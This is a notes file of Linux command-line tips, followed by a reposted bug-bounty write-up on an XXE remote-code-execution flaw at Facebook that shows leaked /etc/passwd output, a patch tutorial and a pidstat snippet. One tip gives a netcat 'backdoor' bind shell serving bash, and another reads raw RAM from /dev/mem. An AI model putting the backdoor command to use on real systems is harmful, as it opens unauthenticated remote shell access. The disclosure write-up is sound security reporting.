#### Make 'less' behave like 'tail -f'

less +F somelogfile

# Using +F will put less in follow mode. This works similar to 'tail -f'. To stop scrolling, use the interrupt. Then you'll get the normal benefits of less (scroll, etc.). #

# Pressing SHIFT-F will resume the 'tailling'. #

#### Set audible alarm when an IP address comes online ####

ping -i 60 -a IP_address

# Waiting for your server to finish rebooting? Issue the command above and you will hear a beep when it comes online. The -i 60 flag tells ping to wait for 60 seconds between ping, putting less strain on your system. Vary it to your need. The -a flag tells ping to include an audible bell in the OUTPUT when a package is received (that is, when your server comes online). #

#### Backticks are evil ####

echo "The date is: $(date +%D)"

# This is a simple example of using proper command nesting using $() over ". There are a number of advantages of $() over backticks #

program1 $(program2 $(program3 $(program4)))

versus

program1 `program2 \`program3 \`program4\`\``

# First: they can be easily nested without escapes: #

# Second: They're easier to read, then trying to decipher the difference between the backtick and the singlequote: `'. The only drawback $() suffers from is lack of total portability. If your script must be portable to the archaic Bourne shell, or old versions of the C-shell or Korn shell, then backticks are appropriate, otherwise, we should all get into the habit of $(). Your future script maintainers will thank you for producing cleaner code. #

#### Simulate typing ####

echo "You can simulate on-screen typing just like in the movies" | pv -qL 10

# This will OUTPUT the characters at 10 per second #

#### python smtp server ####

python -m smtpd -n -c DebuggingServer localhost:1025

# This command will start a simple SMTP server listening on port 1025 of localhost. This server simply prints to standard OUTPUT all email headers and the email body. #

#### Watch Network Service Activity in Real-time ####

lsof -i

#### diff two unsorted files without creating temporary files ####

diff <(sort file1) <(sort file2)

# bash/ksh subshell redirection (as file descriptors) used as input to diff #

#### Rip audio from a video file ####

mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <out-file> <input-file>

# replace accordingly #

#### Matrix Style ####

tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"

#### This command will show you all the string (plain text) values in ram ####

sudo dd if=/dev/mem | cat | strings

A fun thing to do with ram is actually open it up and take a peek.

#### Display which distro is installed ####

cat /etc/issue

#### Easily search running processes (alias) ####

alias 'ps?'='ps ax | grep '

#### Create a script of the last executed command ####

echo "!!" > foo.sh

# Sometimes commands are long, but useful, so it's helpful to be able to make them permanent without having to retype them. An alternative could use the history command, and a cut/sed line that works on your platform. #

history -1 | cut -c 7- > foo.sh

#### Extract tarball from internet without local saving ####

wget -qO - "http://www.tarball.com/tarball.gz" | tar zxvf -

#### Create a backdoor on a machine to allow remote connection to bash ####

nc -vv -l -p 1234 -e /bin/bash

# This will launch a listener on the machine that will wait for a connection on port 1234. When you connect from a remote machine with something like : #

nc 192.168.0.1 1234

# You will have console access to the machine through bash. (becareful with this one) #

#### Monitor progress of a command ####

pv access.log | gzip > access.log.gz

# Pipe viewer is a terminal-based tool for monitoring the progress of data through a pipeline. It can be inserted into any normal pipeline between two processes to give a visual indication of how quickly data is passing through, how long it has taken, how near to completion it is, and an estimate of how long it will be until completion. Source: http://www.catonmat.net/blog/unix-utilities-pipe-viewer/ #

#### Graphical tree of sub-directories ####

ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'

# Prints a graphical directory tree from your current directory #

#### Delete all files in a folder that don't match a certain file extension ####

rm !(*.foo|*.bar|*.baz)

# Deletes all files in a folder that are NOT *.foo, *.bar or *.baz files. Edit the pattern inside the brackets as you like. #

#### Easy and fast access to often executed commands that are very long and complex. ####


some_very_long_and_complex_command # label

# When using reverse-i-search you have to type some part of the command that you want to retrieve. However, if the command is very complex it might be difficult to recall the parts that will uniquely identify this command. Using the above trick it's possible to label your commands and access them easily by pressing ^R and typing the label (should be short and descriptive). #

#### Define a quick calculator function ####

? () { echo "$*" | bc -l; }

# defines a handy function for quick calculations from cli #


#### Display a cool clock on your terminal ####

watch -t -n1 "date +%T|figlet"

# This command displays a clock on your terminal which updates the time every second. Press Ctrl-C to exit #

# A couple of variants: #

# A little bit bigger text: #

watch -t -n1 "date +%T|figlet -f big"You can try other figlet fonts, too.

# Big sideways characters: #

watch -n 1 -t '/usr/games/banner -w 30 $(date +%M:%S)'   - This requires a particular version of banner and a 40-line terminal or you can adjust the width ("30" here).

#### intercept stdout/stderr of another process ####

strace -ff -e trace=write -e write=1,2 -p SOME_PID

#### Remove duplicate entries in a file without sorting. ####

awk '!x[$0]++' <file>

# Using awk, find duplicates in a file without sorting, which reorders the contents. awk will not reorder them, and still find and remove duplicates which you can then redirect into another file. #

#### Insert the last command without the last argument (bash) ####

!:-

/usr/sbin/ab2 -f TLS1 -S -n 1000 -c 100 -t 2 http://www.google.com/then

!:- http://www.urfix.com/is the same as
/usr/sbin/ab2 -f TLS1 -S -n 1000 -c 100 -t 2 http://www.urfix.com/

#### Convert seconds to human-readable format ####

date -d@1234567890

# This example, for example, produces the OUTPUT, "Fri Feb 13 15:26:30 EST 2009" #

#### Job Control ####

^Z $bg $disown

# You're running a script, command, whatever.. You don't expect it to take long, now 5pm has rolled around and you're ready to go home... Wait, it's still running... You forgot to nohup it before running it... Suspend it, send it to the background, then disown it... The ouput wont go anywhere, but at least the command will still run... #

#### Edit a file on a remote host using vim ####

vim scp://username@host//path/to/somefile

#### Monitor the queries being run by MySQL ####

watch -n 1 mysqladmin --user=<user> --password=<password> processlist

# Watch is a very useful command for periodically running another command - in this using mysqladmin to display the processlist. This is useful for monitoring which queries are causing your server to clog up. More info here: http://codeinthehole.com/archives/2-Monitoring-MySQL-processes.html #

#### escape any command aliases ####

\[command]

e.g. if rm is aliased for 'rm -i', you can escape the alias by prepending a backslash:

rm [file]   - will prompt for confirmation per the alias

\rm [file]   - will NOT prompt for confirmation per the default behavior of the command

#### Show apps that use internet connection at the moment. (Multi-Language) ####

ss -p

# for one line per process: #

ss -p | catfor ESTABLISHED sockets only:

ss -p | grep STAfor just process names:

ss -p | cut -f2 -sd\"or

ss -p | grep STA | cut -f2 -d\"

#### Send pop-up notifications on Gnome ####

notify-send ["<title>"] "<body>"

# The title is optional #

# Options: #

-t: expire time in milliseconds.

-u: urgency (low, normal, critical).

-i: icon path.

# On Debian-based systems you may need to install the 'libnotify-bin' package. #

# Useful to advise when a wget download or a simulation ends. Example: #

wget URL ; notify-send "Done"

#### quickly rename a file ####

mv filename.{old,new}

#### Remove all but one specific file ####

rm -f !(survivior.txt)

#### Generate a random password 30 characters long ####

strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo

# Find random strings within /dev/urandom. Using grep filter to just Alphanumeric characters, and then print the first 30 and remove all the line feeds #

#### Run a command only when load average is below a certain threshold ####

echo "rm -rf /unwanted-but-large/folder" | batch

# Good for one off jobs that you want to run at a quiet time. The default threshold is a load average of 0.8 but this can be set using atrun #

#### Processor / memory bandwidthd? in GB/s ####

dd if=/dev/zero of=/dev/null bs=1M count=32768

# Read 32GB zero's and throw them away. How fast is your system? #

#### Backup all MySQL Databases to individual files ####

for i in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $i | gzip > "$i.sql.gz"; done

#### send a circular ####

echo "dear admin, please ban johnlame" | wall

Broadcast Message from root@urfix.com
(/dev/pts/2) at 20:32

dear admin, please ban johnlame

#### Find usb device ####

diff <(lsusb) <(sleep 3s && lsusb)

# I often use it to find recently added or removed device, or using find in /dev, or anything similar. Just run the command, plug the device, and wait to see him and only him #

#### Use "file" to view device information ####

file -s /dev/sd*

# file can print details about certain devices in the /dev/ directory (block devices in this example). This helped me to know at a glance the location and revision of my bootloader, UUIDs, filesystem status, which partitions were primaries / logicals, etc.. without running several commands. #

# See also #

file -s /dev/dm-* file -s /dev/cciss/*

#### Stop Flash from tracking everything you do. ####


for i in ~/.adobe ~/.macromedia ; do ( rm $i/ -rf ; ln -s /dev/null $i ) ; done

# Brute force way to block all LSO cookies on a Linux system with the non-free Flash browser plugin. Works just fine for my needs. Enjoy. #

#### send a circular part 2 ####

wall <<< "Broadcast This"


#### Single use vnc-over-ssh connection ####

ssh -f -L 5900:localhost:5900 your.ssh.server "x11vnc -safer -localhost -nopw -once -display :0"; vinagre localhost:5900

#### Compare copies of a file with md5 ####

cmp file1 file2

#### back ssh from firewalled hosts ####

ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip

# host B (you) redirects a modem port (62220) to his local ssh. #

# host A is a remote machine (the ones that issues the ssh cmd). #

# once connected port 5497 is in listening mode on host B. # 

# host B just do a: #

ssh 127.0.0.1 -p 5497 -l user

# and reaches the remote host'ssh. This can be used also for vnc and so on. #

#### Run a program transparently, but print a stack trace if it fails ####

gdb -batch -ex "run" -ex "bt" ${my_program} 2>&1 | grep -v ^"No stack."$

# For automated unit tests I wanted my program to run normally, but if it crashed, to add a stack trace to the output log. I came up with this command so I wouldn't have to mess around with core files. The one downside is that it does smoosh your program's stderr and stdout together. #

#### Create a new file ####

> file

#### stderr in color ####

mycommand 2> >(while read line; do echo -e "\e[01;31m$line\e[0m"; done)

#### Rename HTML files according to their title tag ####

perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html

# The above one-liner could be run against all HTML files in a directory. It renames the HTML files based on the text contained in their title tag. This helped me in a situation where I had a directory containing thousands of HTML documents with meaningless filenames. #

#### Make vim open in tabs by default (save to .profile) ####

alias vim="vim -p"

# I always add this to my .profile rc so I can do things like: "vim *.c" and the files are opened in tabs. #

#### Look for English words in /dev/urandom ####

head -100000 /dev/urandom | strings|tr '[A-Z]' '[a-z]'|sort >temp.txt && wget -q http://www.mavi1.org/web_security/wordlists/webster-dictionary.txt -O-|tr '[A-Z]' '[a-z]'|sort >temp2.txt&&comm -12 temp.txt temp2.txt

#### Find a CommandlineFu users average command rating ####

wget -qO- www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}'

#### Set laptop display brightness ####

echo <percentage> > /proc/acpi/video/VGA/LCD/brightness

# Run as root. Path may vary depending on laptop model and video card (this was tested on an Acer laptop with ATI HD3200 video). #

 cat /proc/acpi/video/VGA/LCD/brightnessto 

# discover the possible values for your display. #

#### Send your terminfo to another machine ####

infocmp rxvt-unicode | ssh 10.20.30.40 "mkdir -p .terminfo && cat >/tmp/ti && tic /tmp/ti"

# I frequently use this trick to send my terminal settings to HPUX and older RHEL systems. This is due to the fact that terminfo support for rxvt-unicode (my preferred terminal app) does not exist on many older Linux and Unices. #

#### Efficient remote forensic disk acquisition gpg-crypted for multiple recipients ####

dd if=/dev/sdb | pigz | gpg -r <recipient1> -r <recipient2> -e --homedir /home/to/.gnupg | nc remote_machine 6969

# Acquires a bit-by-bit data image, gzip-compresses it on multiple cores (pigz) and encrypts the data for multiple recipients (gpg -e -r). It finally sends it off to a remote machine. #

#### Look up a unicode character by name ####

exec 5< <(grep -i "$*" $(locate CharName.pm)); while read <&5; do h=${REPLY%% *}; /usr/bin/printf "\u$h\tU+%s\t%s\n"  "$h"  "${REPLY##$h }"; done

#### strips the first field of each line where the delimiter is the first ascii character ####

cut -f2 -d `echo -e '\x01'` file

#### shell equivalent of a boss button ####

cat /dev/urandom | hexdump -C | highlight ca fe 3d 42 e1 b3 ae f8 | perl -MTime::HiRes -pnE "Time::HiRes::usleep(rand()*1000000)"

# Nobody wants the boss to notice when you're slacking off. This will fill your shell with random data, parts of it highlighted. #

# Note that 'highlight' is the Perl module App::highlight, not "a universal sourcecode to formatted text converter." You'll also need Term::ANSIColor. #

#### Open Remote Desktop (RDP) from command line having a custom screen size ####

xfreerdp --plugin rdpsnd -g 1280x720 -a 24 -z -x m -u $username -p $password 10.20.30.40

# This example uses xfreerdp, which builds upon the development of rdesktop. This example usage will also send you the remote machine's sound. #

#### Show memory stats on Nexenta/Solaris ####

echo ::memstat | mdb -k

#### Create a pdf version of a manpage ####

man -t manpage | ps2pdf - filename.pdf

# Quick and dirty version. I made a version that checks if a manpage exists (but it's not a oneliner). You must have ps2pdf and of course Ghostscript installed in your box. #

#### informacion sobre coreutils ####

info coreutils

#### ver informacion dmesg al inicio del sistema ####

borrar "quiet splash" en el archivo "/etc/default/grub"  - actualizar grub con: sudo update-grub   - reiniciar

#### iniciar el sistema operativo en modo texto lo que antes se hacia con "init 3" ####

editamos el archivo "/etc/default/grub" y agregamos "text" en la linea "GRUB_CMDLINE_LINUX_DEFAULT="" para que quede "GRUB_CMDLINE_LINUX_DEFAULT="text"

#### relog en la terminal ####

watch -t -n 1 'date +%H:%M:%S | figlet'

#### relog en la terminal 2 ####

watch -t -n 1 'date +%H:%M:%S | toilet'

#### una vaca que te dice la hora ####

watch -t -n 1 'date +%H:%M:%S | cowsay'

#############################################################################################################################################################################################

######################################################################################### bugbounty #########################################################################################

#### bugbounty

# XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook's servers #

Hi, since I don't write much, let me first introduce myself. My name is Reginaldo Silva and I'm a brazilian computer engineer. These days I work mostly with information security, with a special interest in Web Application Security. I.E. if you let me, I'll find ways to hack into your site or application, hopefully before the bad guys do. You'll find a little more information about me going to my home page.

Today I want to share a tale about how I found a Remote Code Execution bug affecting Facebook. Like all good tales, the beginning was a long time ago (actually, just over a year, but I measure using Internet Time, so bear with me). If you find this interesting and want to hire me to do a security focused review or penetration testing in your own (or your company's) code, don't hesitate to send me an email at reginaldo@ubercomp.com.

September 22nd, 2012 was a very special day for me, because it was the day I found a XML External Entity Expansion bug affecting the part of Drupal that handled OpenID. XXEs are very nice. They allow you to read any files on the filesystem, make arbitrary network connections, and just for the kicks you can also DoS the server with the billion laughs attack.

I was so naive at the time that I didn't even bother to check if anyone else was vulnerable. I reported it immediately. I wanted to start putting CVEs on my resume as soon as possible, and this would be the first (it eventually got CVE-2012-4554 assigned to it). Only five days later it occurred to me that OpenID was pretty heavily used and so maybe other places were vulnerable as well. I decided to check the StackOverflow login form. Indeed, it was vulnerable to the whole thing (file reading and all).

Then I decided to try to find OpenID handling code running inside Google's servers. I wasn't able to read files or open network connections, but both App Engine and Blogger were vulnerable to DoS. This is how I got my first bounty from Google, by the way. It was a US$ 500 bounty.

After reporting the bug to Google, I ran some more tests and eventually noticed that the bug I had in my hands was affecting a lot of implementations. I won't enumerate the libraries here, but let me just say that this single bug affected, in one way or another, libraries implemented in Java, C#, PHP, Ruby, Python, Perl, and then more... The only reason I'm not publishing the PoC here is that there are a lot of servers who are still vulnerable out there. Of course, the people who know about security will just read OpenID and XXE and then write an exploit in about 5 minutes, but I digress.

So after contacting (or trying to contact) every OpenID library author out there, I decided to write to the member-only security list hosted at the OpenID foundation an email titled "One bug to rule them all: many implementations of OpenID are vulnerable to XXE" to share my findings. I figured most library authors would be members of that list and so patches would be released for everyone very soon. I was right, but only partially.

The persistent readers who are still with me by now are thinking: what does a Facebook Remote Code Execution bug has to do with all this? Well, I knew Facebook allowed OpenID login in the past. However, when I first found the OpenID bug in 2012 I couldn't find any endpoint that would allow me to enter an arbitrary OpenID URL. From a Google search I knew that in the past you could do something like https://www.facebook.com/openid/consumer_helper.php?openid.mode=checkid_setup&user_claimed_id=YOUR_CLAIMED_ID_HERE&context=link&request_id=0&no_extensions=false&third_party_login=false, but now the consumer_helper.php endpoint is gone. So for more than a year I thought Facebook was not vulnerable at all, until one day I was testing Facebook's Forgot your password? functionality and saw a request to https://www.facebook.com/openid/receiver.php.

That's when I began to suspect that Facebook was indeed vulnerable to that same XXE I had found out more than a year ago. I had to work a lot to confirm this suspicion, though. Long story short, when you forget your password, one of the ways you can prove to Facebook that you own an @gmail.com account is to log into your Gmail and authorize Facebook to get your basic information (such as email and name). The way this works is you're actually logging into Facebook using your Gmail account, and this login happens over OpenID. So far, so good, but this is where I got stuck. I knew that, for my bug to work, the OpenID Relying Party (RP - Facebook) has to make a Yadis discovery request to an OpenID Provider (OP) under the attacker's control. Let's say http://www.ubercomp.com/. Then my malicious OP will send a response with the rogue XML that will then be parsed by the RP, and the XXE attack will work.

Since the initial OpenID request (a redirect from Facebook to Google) happens without my intervention, there was no place for me to actually enter an URL under my control that was my OpenID identifier and have Facebook send a Yadis Discover request to that URL. So I thought the bug would not be triggered at all, unless I could somehow get Google to send Facebook a malicious XML, which was very unlikely. Fortunately, I was wrong. After a more careful reading of the OpenID 2.0 Specification, I found this nice gem in session 11.2 - Verifying Discovered Information:

    "If the Claimed Identifier was not previously discovered by the Relying Party (the "openid.identity" in the request was "http://specs.openid.net/auth/2.0/identifier_select" or a different Identifier, or if the OP is sending an unsolicited positive assertion), the Relying Party MUST perform discovery on the Claimed Identifier in the response to make sure that the OP is authorized to make assertions about the Claimed Identifier".

I checked and, indeed, the openid.identity in the request was http://specs.openid.net/auth/2.0/identifier_select. This is a very common practice, actually. So indeed after a few minutes I was able to make a request to https://www.facebook.com/openid/receiver.php that caused Facebook to perform a Yadis discovery on a URL under my control, and the response to that request would contain malicious XML. I knew I had a XXE because when I told Facebook's server to open /dev/random, the response would never come and eventually a request killer would kick in after a few minutes. But I still couldn't read any file contents. I tried everything on the XXE bag of tricks (including weird combinations involving parameter entities, but nothing. I then realized I had a subtle bug in my exploit. Fixed that, and then...

$ bash exploit.sh
* About to connect() to www.facebook.com port 80 (#0)
*   Trying 31.13.75.1... connected
* Connected to www.facebook.com (31.13.75.1) port 80 (#0)
> GET /openid/receiver.php?provider_id=1010459756371
    &context=account_recovery&protocol=http&request_id=1
    &openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0
    &openid.mode=id_res&openid.op_endpoint=...(redacted)... HTTP/1.1
> Host: www.facebook.com
> Accept: */*
> User-Agent: Chrome
>
< HTTP/1.1 200 OK
< Cache-Control: private, no-cache, no-store, must-revalidate
< Expires: Sat, 01 Jan 2000 00:00:00 GMT
< P3P: CP="Facebook does not have a P3P policy. Learn why here:
    http://fb.me/p3p"
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: DENY
< X-XRDS-Location: http://www.facebook.com/openid/xrds.php
< X-XSS-Protection: 0
< Set-Cookie: datr=...(redacted)...; expires=Thu, 19-Nov-2015 15:34:24 GMT; 
    path=/; domain=.facebook.com; httponly
< Set-Cookie: reg_ext_ref=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT;
    path=/; domain=.facebook.com
< Set-Cookie: reg_fb_gate=http%3A%2F%2Fwww.facebook.com%2Fopenid%2Freceiver.php
    %3Fprovider_id%3D1010459756371%26context%3Daccount_recovery%26protocol%3Dhttp
    %26request_id%3D1%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth
    %252F2.0%26openid.mode%3Did_res%26openid.op_endpoint%3D...(redacted)...;
    path=/; domain=.facebook.com
< Set-Cookie: reg_fb_ref=http%3A%2F%2Fwww.facebook.com%2Fopenid%2Freceiver.php
    %3Fprovider_id%3D1010459756371%26context%3Daccount_recovery%26protocol%3Dhttp
    %26request_id%3D1%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth
    %252F2.0%26openid.mode%3Did_res%26openid.op_endpoint%3D...(redacted)...;
    path=/; domain=.facebook.com
< Content-Type: text/html; charset=utf-8
< X-FB-Debug: ...(redacted)...
< Date: Tue, 19 Nov 2013 15:34:24 GMT
< Transfer-Encoding: chunked
< Connection: keep-alive
<
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<script>
function envFlush(a) {
    function b(c) {
        for (var d in a) c[d] = a[d];
    }
    if (window.requireLazy) {
        window.requireLazy(['Env'], b);
    } else {
        Env = window.Env || {};
        b(Env);
    }
}
envFlush({
    "user": "0"
});
<title>Facebook</title>
<script src="http://static.ak.fbcdn.net/rsrc.php/v2/yR/r/Bx6hq_79BTx.js" crossorigin="anonymous"></script>
<script type="text/javascript">window.Bootloader &&
  Bootloader.done(["ASVup"]);</script>
</head>

<body class="Locale_en_US">
<script type="text/javascript">
Bootloader.setResourceMap({
    "\/2NZV": {
        "type": "js",
        "crossOrigin": 1,
        "src": "http:\/\/static.ak.fbcdn.net\/rsrc.php\/v2\/yo\/r\/CAz6i9Uu16e.js"
    },
    "GduTW": {
        "type": "js",
        "crossOrigin": 1,
        "src": "http:\/\/static.ak.fbcdn.net\/rsrc.php\/v2\/yu\/r\/aGXWJInaxrx.js"
    }
});
</script>
<script type="text/javascript">
require("InitialJSLoader").loadOnDOMContentReady(["GduTW","\/2NZV"]);
</script>
<script type="text/javascript">
Bootloader.configurePage([]);
Bootloader.done([]);


require("InitialJSLoader").handleServerJS({
    "require": [
        ["OnloadHooks"],
        ["lowerDomain"]
    ]
});

onloadRegister_DEPRECATED(function () {
    openid_submit_response({
        "__ar": 1,
        "error": 1428005,
        "errorSummary": "Error while processing response",
        "errorDescription": {
            "__html": " \
There was an error while processing the OpenID response. \
No matching endpoint found after discovering http:\/\/www.ubercomp.com\/...(redacted)... \
<br \/><br \/> OP Endpoint mismatch. Expected http:\/\/www.ubercomp.com\/...(redacted)..., \
got http:\/\/www.ubercomp.com\/...(REDACTED).../?x=\
root:x:0:0:root:\/root:\/bin\/bash\n \
bin:x:1:1:bin:\/bin:\/sbin\/nologin\n \
daemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\n \
adm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\n \
lp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\n \
sync:x:5:0:sync:\/sbin:\/bin\/sync\n \
shutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\n \
halt:x:7:0:halt:\/sbin:\/sbin\/halt\n \
mail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\n \
uucp:x:10:14:uucp:\/var\/spool\/uucp:\/sbin\/nologin\n \
operator:x:11:0:operator:\/root:\/sbin\/nologin\n \
games:x:12:100:games:\/usr\/games:\/sbin\/nologin\n \
gopher:x:13:30:gopher:\/var\/gopher:\/sbin\/nologin\n \
ftp:x:14:50:FTP User:\/var\/ftp:\/sbin\/nologin\n \
nobody:x:99:99:Nobody:\/:\/sbin\/nologin\n \
dbus:x:81:81:System message bus:\/:\/sbin\/nologin\n \
...(REDACTED)..."
        },
        "payload": null,
        "bootloadable": {},
        "ixData": []
    }, 1)
});
</script>
</body>
</html>
* Connection #0 to host www.facebook.com left intact
* Closing connection #0


That's right, the response contained Facebook's /etc/passwd. Now we were going somewhere. By then I knew I had found the keys to the kingdom. After all, having the ability to read (almost) any file and open arbitrary network connections through the point of view of the Facebook server, and which doesn't go through any kind of proxy was surely something Facebook wanted to avoid at any cost. But I wanted more. I wanted to escalate this to a full Remote Execution.

A lot of bug bounty programs around the web have a rule that I think is very sensible: whenever you find a bug, don't linger on messing around. Report the bug right away and the security team will consider the worst case scenario and pay accordingly. However, I didn't have much experience with the security team at Facebook and didn't know if they would consider my bug as a Remote Code Execution or not. I Since I didn't want to cause the wrong impressions, I decided I would report the bug right away, ask for permission to try to escalate it to a RCE and then work on it while it was being fixed. I figured that would be ok because most bugs take a long time to be processed, and so I had plenty of time to try to escalate to an RCE while still keeping the nice imaginary white hat I have on my head. So after writing the bug report I decided to go out and have lunch, and the plan was to continue working when I came back.

However, I was wrong again. Since this was a very critical bug, when I got back home from lunch, a quick fix was already in place. Less than two hours after the initial report was sent. Needless to say, I was very impressed and disappointed at the same time, but since I knew just how I would escalate that attack to a Remote Code Execution bug, I decided to tell the security team what I'd do to escalate my access and trust them to be honest when they tested to see if the attack I had in my mind worked or not. I'm glad I did that. After a few back and forth emails, the security team confirmed that my attack was sound and that I had indeed found a RCE affecting their servers.

So this is how the first high impact bug I ever found was the entry point for an attack that probably got one of the highest payouts of any web security bug bounty program. Plus, and more importantly, I get to brag I broke into Facebook... Nice, huh? Oh, by the way, the Facebook security team wrote a post to tell their side of the story.

Timeline

All timestamps are in GMT. I omitted a few unimportant interactions about the acknowledgements page and such.

    2013-11-19 3:51 pm: Initial report
    2013-11-19 5:37 pm: Bug acknowledged by security team member Godot
    2013-11-19 5:46 pm: I replied by sending a PoC to read arbitrary files
    2013-11-19 7:31 pm: Security team member Emrakul informed me that a short term fix was already in place and would be live in approximately 30 minutes
    2013-11-19 8:27 pm: I replied confirming that the bug was patched.
    2013-11-21 8:03 pm: Payout set. The security team informed me it was their biggest bounty payout to date.
    2013-11-22 2:13 am: I sent an email asking whether the security team had already considered the bug as RCE or just as a file disclosure.
    2013-11-23 1:17 am: Security team replied that they did not considered the attack could be escalated to RCE.
    2013-11-23 7:54 pm: I sent an email explaining exactly how the attack could be escalated to an RCE (with file paths, example requests and all).
    2013-11-24 9:23 pm: Facebook replied that my attack worked and they'd have to work around it.
    2013-12-03 4:45 am: Facebook informed me that the longer term fix was in place and that they'd soon have a meeting to discuss a new bounty amount
    2013-12-03 7:14 pm: I thanked them and said I'd cross my fingers
    2013-12-13 1:04 pm: I found a Bloomberg article quoting Ryan McGeehan, who managed Facebook's incident response unit, saying that "If there's a million dollar bug, we will pay it out" and asked if there was any news.
    2013-12-30 4:45 am: Facebook informed me that, since the bug was now considered to be RCE, the payout would be higher. I won't disclose the amount, but if you have any comments about how much you think this should be worth, please share them. Unfortunately, I didn't get even close to the one-million dollar payout cited above. In case you're wondering, I quoted Mr. McGeehan mostly as a joke.

#############################################################################################################################################################################################

############################################################################################ patch ##########################################################################################

#### patch tgs

# When there is a security fix available for a particular software, we typically do a binary upgrade using the package management tools like yum or apt-get. But, there might be situation where you have installed a software by compiling it from the source code. In those situation, how do you apply the security fix to the software? The answer is to download the security patch and apply it to the original source code and re-compile the software. This tutorial explains how to create a patch file using diff, and apply it using patch command. #

# A patch file is a text file which contains the differences between two versions of the same file (or same source-tree). Patch file is created by using diff command. 3

#### 1. Create a Patch File using diff ####

# To understand this, let us create a small C program named hello.c #


#include <stdio.h> 

int main() {
printf("Hello World\n");
}


# Now, copy the hello.c to hello_new.c #

$ cp hello.c hello_new.c


# Edit the hello_new.c as shown below to make some small changes: #

#include <stdio.h>

int main(int argc, char *argv[]) {
printf("Hello World\n");
return 0;
}


# Finally, create the patch file using diff command as shown below: #

$ diff -u hello.c hello_new.c > hello.patch


# The above command will create a patch file named "hello.patch". #

--- hello.c	2014-10-07 18:17:49.000000000 +0530
+++ hello_new.c	2014-10-07 18:17:54.000000000 +0530
@@ -1,5 +1,6 @@
 #include <stdio.h>
 
-int main() {
+int main(int argc, char *argv[]) {
 	printf("Hello World\n");
+	return 0;
 }


# 2. Apply Patch File using Patch Command #

The "patch" command takes a patch file as input and apply the differences to one or more original file(s), producing patched versions.

patch -p[num] < patchfile
patch [options] originalfile patchfile 


# Use the patch command as shown below to apply the hello.patch to the original hello.c source code. #

$ patch < hello.patch
patching file hello.c


# The hello.patch file contains the name of the file to be patched. Once the file is patched, both hello.c and hello_new.c will have the content. #


# 3. Create a Patch From a Source Tree #

The above example was so simple that it works only with one file. We will see how to create and apply patch for a complete source tree by taking "openvpn" source code as example.

I've downloaded 2 version of openvpn, openvpn-2.3.2 and openvpn-2.3.4.

tar -xvzf openvpn-2.3.2.tar.gz

tar -xvzf openvpn-2.3.4.tar.gz


Now we will create the patch using the following command.

diff -Naur /usr/src/openvpn-2.3.2 /usr/src/openvpn-2.3.4 > openvpn.patch

The above command will operate recursively and find the differences, and place those differences in the patch file.


# 4. Apply Patch File to a Source Code Tree #

The following patch commands can be used to apply the patch to source tree.

# patch -p3 < /root/openvpn.patch
patching file openvpn-2.3.2/aclocal.m4
patching file openvpn-2.3.2/build/Makefile.in
patching file openvpn-2.3.2/build/msvc/Makefile.in
...

Please note that we are executing the command from /usr/src/. The patch file contains all the filenames in absolute path format( from root ). So when we execute from /usr/src, without the "-p" option, it will not work properly.

-p3 tells the patch command to skip 3 leading slashes from the filenames present in the patch file. In our case, the filename in patch file is "/usr/src/openvpn-2.3.2/aclocal.m4?, since you have given "-p3?, 3 leading slashes, i.e. until /usr/src/ is ignored.


# 5. Take a Backup before Applying the Patch using -b #

You can take a backup of the original file before applying the patch command using the -b option as shown below.

$ patch -b < hello.patch
patching file hello.c

Now you will have a file name "hello.c.orig", which is the backup of the original hello.c.

You can also use -V to decide the backup filename format as shown below. Now you will have a file name "hello.c.~1~".

$ patch -b -V numbered < hello.patch
patching file hello.c


# 6. Validate the Patch without Applying (Dry-run Patch File) #

You can dry run the patch command to see if you are getting any errors, without patching the file using -dry-run option as shown below.

$ patch --dry-run < hello.patch
patching file hello.c

You can see that hello.c is not modified at all.


# 7. Reverse a Patch that is Already Applied (Undo a Patch) #

You can use the -R option to reverse a patch which is applied already.

$ patch < hello.patch
patching file hello.c

$ ls -l hello.c
-rw-r--r-- 1 lakshmanan users  94 2014-10-07 20:05 hello.c

$ patch -R < hello.patch
patching file hello.c

$ ls -l hello.c
-rw-r--r-- 1 lakshmanan users  62 2014-10-07 20:04 hello.c

You can notice from the filesize, that the patch, which is applied already is reversed when we used the -R option.

#############################################################################################################################################################################################

########################################################################################### sysstat #########################################################################################

#### pidstat

# pidstat stands for PID Statistics #

# This tool can monitor an individual process that is managed by kernel and generate a report. It can monitor either a specific PID (process id), or all the process running on the system. pidstat is a part of sysstat utility. This tool reports various statistics including CPU used by a process, disk usage statistics of a process, statistics for threads associated with selected tasks and child processes. #

# You should install systat package to use this command. #

sudo apt-get install sysstat


# 1. Display Statistics for ALL Running Process (or a Specific Process) #

Use -p ALL option to view performance statistics of all running process as shown below.

By default this will display the CPU usage. But, you can change this to any other performance statistics as shown in later examples.

# pidstat -p ALL | wc -l
165

# pidstat -p ALL | head
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

05:00:03          PID    %usr %system  %guest    %CPU   CPU  Command
05:00:03            1    0.00    0.00    0.00    0.00     0  init
05:00:03            2    0.00    0.00    0.00    0.00     0  kthreadd
05:00:03            3    0.00    0.00    0.00    0.00     0  ksoftirqd/0
05:00:03            6    0.00    0.00    0.00    0.00     0  migration/0
